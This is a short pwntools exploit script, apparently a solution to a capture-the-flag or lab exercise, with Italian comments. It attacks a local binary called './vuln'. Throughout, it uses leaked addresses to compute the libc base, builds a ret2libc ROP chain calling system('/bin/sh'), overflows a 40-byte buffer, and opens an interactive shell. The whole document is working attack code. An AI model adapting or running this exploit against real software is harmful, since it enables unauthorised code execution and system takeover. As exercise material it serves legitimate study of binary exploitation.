import sys

from pwn import *
context(os='linux',arch='amd64')
p = process("./vuln")

reference_to_binary = ELF('./vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')


#pattern search e pattern create 
buf = b'\x55' * 40 

# Reading the leaked addresses
stack = p.recvline().split(b' ')[-1].strip()
system = p.recvline().split(b' ')[-1].strip()
printf = p.recvline().split(b' ')[-1].strip()



#ldd vuln
#readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system
system_offset = 0x52290 

#il file mi fa il leak dell'indirizzo della system, quindi se prenso l'offset posso calcolare l'indirizzo base della libc
libc_base = int(system, 16) - system_offset

libc.address = libc_base

rop_chain = ROP(libc)

#questo mi serve per allineare lo stack
ret = p64(rop_chain.find_gadget(['ret'])[0])

bin_sh = next(libc.search(b'/bin/sh'))

#rop_chain.call('puts', [0x40202d])
rop_chain.call('system', [bin_sh])

print(rop_chain.dump())
payload = buf + ret+ rop_chain.chain()

p.sendline(payload)



p.interactive()
